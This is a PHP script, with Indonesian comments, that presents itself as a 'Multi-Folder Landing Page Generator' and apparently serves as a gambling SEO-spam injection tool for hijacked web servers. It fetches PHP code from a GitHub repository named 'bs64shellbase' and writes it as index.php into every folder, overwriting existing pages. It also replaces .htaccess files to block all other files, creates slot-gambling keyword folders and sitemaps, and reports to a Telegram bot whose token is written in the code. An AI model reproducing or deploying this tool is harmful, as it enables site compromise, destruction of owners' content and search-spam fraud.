<?php
$keywords = [
    'ok88', 'ok88-gacor', 'ok88-slotgacor', 'ok88-gambler', 'ok88-online-kasino',
    'slot-gacor-hari-ini', 'link-slot-gacor-terpercaya', 'slot-bonus-new-member',
    'rtp-slot-tertinggi', 'slot-gacor-pragmatic'
];

$telegramToken = '8481177639:AAGRYKPlQxr1PXcMqHgBTQo3MmmSkv_iI7w';
$chatId = '1883446251';
$templateUrl = 'https://raw.githubusercontent.com/Cnull00/bs64shellbase/refs/heads/main/lp3.php';

// Fungsi untuk mengirim notifikasi Telegram
function sendTelegram($token, $chatId, $message) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $message];
    @file_get_contents($url . '?' . http_build_query($data));
}

// Fungsi untuk memeriksa status URL
function is_url_ok($url) {
    sleep(1); // Jeda untuk menghindari deteksi bot
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_NOBODY => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($httpcode == 200);
}

// Fungsi untuk membuat landing page di semua folder
function createLandingPages($basePath, $templateContent, $keywords, $title) {
    $htaccessContent = <<<HT
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

<FilesMatch "^(index\\.php)\$">
    Order Allow,Deny
    Allow from all
</FilesMatch>

<FilesMatch "^(?!index\\.php\$).*$">
    Order Allow,Deny
    Deny from all
</FilesMatch>

<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE text/plain text/html text/xml text/css application/javascript application/json
</IfModule>

<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresByType image/png "access plus 1 month"
</IfModule>

<IfModule mod_headers.c>
    Header set X-Robots-Tag "index, follow"
</IfModule>
HT;

    $allValidUrls = [];
    $processedFolders = [];
    
    // Dapatkan semua folder dalam direktori utama
    $folders = array_filter(glob($basePath . '/*'), 'is_dir');
    
    // Tambahkan direktori utama itu sendiri
    $folders[] = $basePath;
    
    foreach ($folders as $folder) {
        $folderName = basename($folder);
        
        // Skip folder khusus
        if (in_array($folderName, ['.', '..', 'cgi-bin'])) continue;
        
        $processedFolders[] = $folder;
        $validUrls = [];
        
        // Buat landing page utama di folder ini
        $mainPage = str_replace(
            ['{site title index}', '{isi url landingpage}'],
            [$title, $title, "https://".$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF'])."/$folderName/"],
            $templateContent
        );
        
        file_put_contents("$folder/index.php", $mainPage);
        file_put_contents("$folder/.htaccess", $htaccessContent);
        
        $mainUrl = "https://".$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF'])."/$folderName/";
        echo "<script>document.getElementById('status').innerHTML += '📂 Folder: $folderName<br>';</script>";
        echo "<script>document.getElementById('status').innerHTML += '├─ Membuat landing page utama...<br>';</script>";
        flush();
        
        // Buat folder keyword dalam folder ini
        foreach ($keywords as $slug) {
            $targetFolder = "$folder/$slug";
            if (!file_exists($targetFolder)) mkdir($targetFolder, 0777, true);
            
            // Buat landing page keyword
            file_put_contents("$targetFolder/index.php", $mainPage);
            file_put_contents("$targetFolder/.htaccess", $htaccessContent);
            
            $url = $mainUrl . "$slug/";
            echo "<script>document.getElementById('status').innerHTML += '├─── Mengecek: $slug ... ';</script>";
            flush();
            
            if (is_url_ok($url)) {
                $validUrls[] = $url;
                echo "<script>document.getElementById('status').innerHTML += '<span style=\"color:#0f0\">✔</span><br>';</script>";
            } else {
                echo "<script>document.getElementById('status').innerHTML += '<span style=\"color:#f00\">✖</span><br>';</script>";
            }
            flush();
        }
        
        // Simpan URL untuk sitemap
        $allValidUrls[$folder] = [
            'main' => $mainUrl,
            'keywords' => $validUrls
        ];
        
        echo "<script>document.getElementById('status').innerHTML += '└─ Selesai<br><br>';</script>";
        flush();
    }
    
    // Buat sitemap.xml dan robots.txt di root
    $sitemap = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";
    $robotsTxt = "User-agent: *\nAllow: /\n\n";
    
    foreach ($allValidUrls as $folder => $urls) {
        $folderName = basename($folder);
        
        // Tambahkan URL utama ke sitemap
        $sitemap .= "<url>\n<loc>{$urls['main']}</loc>\n<lastmod>".date('Y-m-d')."</lastmod>\n<changefreq>daily</changefreq>\n<priority>1.0</priority>\n</url>\n";
        
        // Tambahkan URL keyword ke sitemap
        foreach ($urls['keywords'] as $url) {
            $sitemap .= "<url>\n<loc>$url</loc>\n<lastmod>".date('Y-m-d')."</lastmod>\n<changefreq>daily</changefreq>\n<priority>0.8</priority>\n</url>\n";
        }
        
        // Tambahkan ke robots.txt
        $robotsTxt .= "Sitemap: {$urls['main']}sitemap.xml\n";
        
        // Buat sitemap khusus folder
        $folderSitemap = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";
        $folderSitemap .= "<url>\n<loc>{$urls['main']}</loc>\n<lastmod>".date('Y-m-d')."</lastmod>\n<changefreq>daily</changefreq>\n<priority>1.0</priority>\n</url>\n";
        
        foreach ($urls['keywords'] as $url) {
            $folderSitemap .= "<url>\n<loc>$url</loc>\n<lastmod>".date('Y-m-d')."</lastmod>\n<changefreq>daily</changefreq>\n<priority>0.8</priority>\n</url>\n";
        }
        
        $folderSitemap .= "</urlset>";
        file_put_contents("$folder/sitemap.xml", $folderSitemap);
        
        // Buat robots.txt khusus folder
        $folderRobots = "User-agent: *\nAllow: /\nSitemap: {$urls['main']}sitemap.xml";
        file_put_contents("$folder/robots.txt", $folderRobots);
    }
    
    $sitemap .= "</urlset>";
    file_put_contents("$basePath/sitemap.xml", $sitemap);
    
    $robotsTxt .= "Sitemap: https://".$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF'])."/sitemap.xml";
    file_put_contents("$basePath/robots.txt", $robotsTxt);
    
    return [
        'folders' => $processedFolders,
        'urls' => $allValidUrls
    ];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ob_implicit_flush(true);
    ob_end_flush();
    echo str_repeat(" ", 1024);
    echo "<div id='status' style='text-align:left;padding:10px;margin:10px auto;max-width:700px;background:#111;color:#0f0;font-family:monospace;'></div>";
    
    $title = htmlspecialchars($_POST['title']);
    $basePath = dirname(__FILE__);
    
    // Ambil template dari GitHub
    $templateContent = @file_get_contents($templateUrl);
    if (!$templateContent) {
        die('<script>document.getElementById("status").innerHTML = "❌ Gagal mengambil template dari GitHub!";</script>');
    }
    
    echo "<script>document.getElementById('status').innerHTML = '🚀 Memulai proses pembuatan landing page...<br><br>';</script>";
    flush();
    
    // Buat landing page di semua folder
    $result = createLandingPages($basePath, $templateContent, $keywords, $title);
    
    // Hitung total URL aktif
    $totalActive = 0;
    foreach ($result['urls'] as $urls) {
        $totalActive += 1 + count($urls['keywords']); // +1 untuk URL utama
    }
    
    // Kirim notifikasi ke Telegram
    $folderCount = count($result['folders']);
    $message = "✅ Landing page berhasil dibuat!\n";
    $message .= "• Total folder: $folderCount\n";
    $message .= "• Total halaman aktif: $totalActive\n";
    $message .= "• Sitemap utama: https://".$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF'])."/sitemap.xml";
    
    sendTelegram($telegramToken, $chatId, $message);
    
    echo "<script>
        document.getElementById('loading').style.display = 'none';
        setTimeout(() => {
            alert('Proses selesai!\\\\n• Folder diproses: $folderCount\\\\n• Halaman aktif: $totalActive');
            window.location = 'index.php';
        }, 2000);
    </script>";
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Multi-Folder Landing Page Generator</title>
  <style>
    :root {
      --primary: #00ff96;
      --primary-dark: #00b894;
      --bg: #0f0f1e;
      --card-bg: rgba(25, 25, 45, 0.8);
      --text: #e6e6ff;
      --text-secondary: #a0a0c0;
      --border: rgba(0, 255, 150, 0.3);
      --shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
    }
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    
    body {
      background: linear-gradient(135deg, var(--bg) 0%, #16213e 100%);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    
    .container {
      background: var(--card-bg);
      backdrop-filter: blur(10px);
      border-radius: 15px;
      box-shadow: var(--shadow);
      border: 1px solid var(--border);
      width: 100%;
      max-width: 700px;
      overflow: hidden;
    }
    
    .header {
      background: rgba(0, 0, 0, 0.3);
      padding: 25px;
      text-align: center;
      border-bottom: 1px solid var(--border);
    }
    
    h1 {
      color: var(--primary);
      font-size: 2.5rem;
      margin-bottom: 10px;
      text-shadow: 0 0 15px rgba(0, 255, 150, 0.5);
    }
    
    .subtitle {
      color: var(--text-secondary);
      font-size: 1.1rem;
    }
    
    .content {
      padding: 30px;
    }
    
    .input-group {
      margin-bottom: 25px;
    }
    
    label {
      display: block;
      margin-bottom: 10px;
      color: var(--primary);
      font-weight: 600;
      font-size: 1.1rem;
    }
    
    input[type="text"] {
      width: 100%;
      padding: 16px;
      background: rgba(30, 30, 50, 0.7);
      border: 2px solid #2c2c54;
      border-radius: 10px;
      color: var(--text);
      font-size: 1.1rem;
      transition: all 0.3s;
    }
    
    input[type="text"]:focus {
      border-color: var(--primary);
      outline: none;
      box-shadow: 0 0 15px rgba(0, 255, 150, 0.3);
    }
    
    .generate-btn {
      background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
      color: #001a14;
      border: none;
      padding: 18px;
      font-size: 1.2rem;
      font-weight: bold;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s;
      width: 100%;
      box-shadow: 0 5px 20px rgba(0, 255, 150, 0.3);
      position: relative;
      overflow: hidden;
    }
    
    .generate-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 25px rgba(0, 255, 150, 0.4);
    }
    
    .generate-btn:active {
      transform: translateY(1px);
    }
    
    .generate-btn::after {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: rgba(255, 255, 255, 0.1);
      transform: rotate(30deg);
      transition: all 0.5s;
      pointer-events: none;
    }
    
    .generate-btn:hover::after {
      transform: rotate(30deg) translate(20%, 20%);
    }
    
    #loading {
      display: none;
      color: var(--primary);
      margin-top: 25px;
      text-align: center;
      font-size: 1.2rem;
      font-weight: 500;
      padding: 15px;
      background: rgba(0, 0, 0, 0.2);
      border-radius: 8px;
    }
    
    .features {
      margin-top: 30px;
      background: rgba(0, 0, 0, 0.2);
      padding: 20px;
      border-radius: 10px;
    }
    
    .features h3 {
      color: var(--primary);
      margin-bottom: 15px;
      padding-bottom: 10px;
      border-bottom: 1px solid var(--border);
      font-size: 1.3rem;
    }
    
    .features-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 15px;
    }
    
    .feature-card {
      background: rgba(30, 30, 50, 0.5);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 15px;
      text-align: center;
      transition: all 0.3s;
    }
    
    .feature-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 5px 15px rgba(0, 255, 150, 0.2);
    }
    
    .feature-icon {
      font-size: 2.5rem;
      color: var(--primary);
      margin-bottom: 10px;
    }
    
    .feature-title {
      font-weight: 600;
      margin-bottom: 5px;
      color: var(--primary);
    }
    
    .feature-desc {
      font-size: 0.9rem;
      color: var(--text-secondary);
    }
    
    .footer {
      text-align: center;
      padding: 20px;
      color: var(--text-secondary);
      font-size: 0.9rem;
      border-top: 1px solid var(--border);
      background: rgba(0, 0, 0, 0.3);
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>Multi-Folder Landing Generator</h1>
      <p class="subtitle">Buat landing page di semua folder secara otomatis</p>
    </div>
    
    <div class="content">
      <form method="POST" onsubmit="showLoading()">
        <div class="input-group">
          <label for="title">Judul Website</label>
          <input type="text" name="title" id="title" required placeholder="Contoh: Situs Slot Terpercaya">
        </div>
        
        <button type="submit" class="generate-btn">
          <span id="button-text">🚀 Jalankan Generator</span>
        </button>
        <div id="loading">⏳ Membuat landing page di semua folder...</div>
      </form>
      
      <div class="features">
        <h3>Fitur Unggulan</h3>
        <div class="features-grid">
          <div class="feature-card">
            <div class="feature-icon">📂</div>
            <div class="feature-title">Scan Folder Otomatis</div>
            <div class="feature-desc">Deteksi semua folder di direktori saat ini</div>
          </div>
          
          <div class="feature-card">
            <div class="feature-icon">🌐</div>
            <div class="feature-title">Landing Page Multi-Folder</div>
            <div class="feature-desc">Buat landing page di setiap folder</div>
          </div>
          
          <div class="feature-card">
            <div class="feature-icon">🔍</div>
            <div class="feature-title">SEO Optimization</div>
            <div class="feature-desc">Sitemap & robots.txt otomatis</div>
          </div>
          
          <div class="feature-card">
            <div class="feature-icon">🤖</div>
            <div class="feature-title">Telegram Notification</div>
            <div class="feature-desc">Notifikasi saat proses selesai</div>
          </div>
        </div>
      </div>
    </div>
    
    <div class="footer">
      &copy; <?= date('Y') ?> Landing Page Generator | Otomasi SEO Multi-Folder
    </div>
  </div>

  <script>
    function showLoading() {
      const button = document.querySelector('.generate-btn');
      const buttonText = document.getElementById('button-text');
      const loading = document.getElementById('loading');
      
      button.disabled = true;
      button.style.opacity = '0.8';
      buttonText.innerHTML = '⏳ Memproses...';
      loading.style.display = 'block';
    }
  </script>
</body>
</html>